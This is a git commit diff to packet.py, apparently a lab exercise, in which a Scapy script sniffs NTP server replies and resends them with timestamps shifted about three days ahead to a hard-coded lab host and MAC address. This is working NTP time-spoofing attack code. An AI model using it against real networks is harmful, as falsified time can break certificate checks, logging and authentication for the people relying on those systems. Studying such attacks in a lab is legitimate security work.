175e87ef581bb78348ed009e50f368f1ce9a8185
mjkadzi <161668993+mjkadzi@users.noreply.github.com>
2024-04-26 22:03:04 -0500

    Update packet.py
    hopeium

--- packet.py
+++ packet.py
@@ -1,12 +1,11 @@
-from scapy.all import IP, UDP, NTP, send, sniff
+from scapy.all import IP, UDP, NTP, send, sniff, Ether
 from scapy.layers.ntp import NTP
 import time, datetime
 
 
 server_ip = "10.10.10.12"
-dest_ip = "10.10.10.10"
 ref_timestamp = time.time() + 259200
-
+#all these values are hard coded for the sake of this exercise
 def send_ntp(server, packet, ref_timestamp):
     ntp_packet = packet
     print("incoming packet")
@@ -17,13 +16,12 @@ def send_ntp(server, packet, ref_timestamp):
     ntp_packet[NTP].orig = time.time() + 259201
     ntp_packet[NTP].recv = time.time() + 259201
     ntp_packet[NTP].sent = time.time() + 259201
+    ntp_packet[Ether].dst = "4e:c1:60:9c:84:bc"
 
     #ip_packet = IP(src=server, dst=dest_ip)
     #udp_packet = UDP(dport=123, sport=123)
-    #print("Packet before sending")
-    #ntp_packet.show()
-    #ip_packet.show()
-    #udp_packet.show()
+    print("Packet before sending")
+    ntp_packet.show()
     #if ntp_packet.haslayer(UDP):
     #    print("new checksum: " + str(ntp_packet[UDP].chksum))
     #else:
@@ -35,7 +33,6 @@ def send_ntp(server, packet, ref_timestamp):
 def ntp_request(packet):
     ntp_layer = packet.getlayer(NTP)
     if ntp_layer and ntp_layer.mode == 4:
-        print("old checksum: " + str(packet[UDP].chksum))
         send_ntp(server_ip, packet, ref_timestamp)
 
 if __name__ == "__main__":
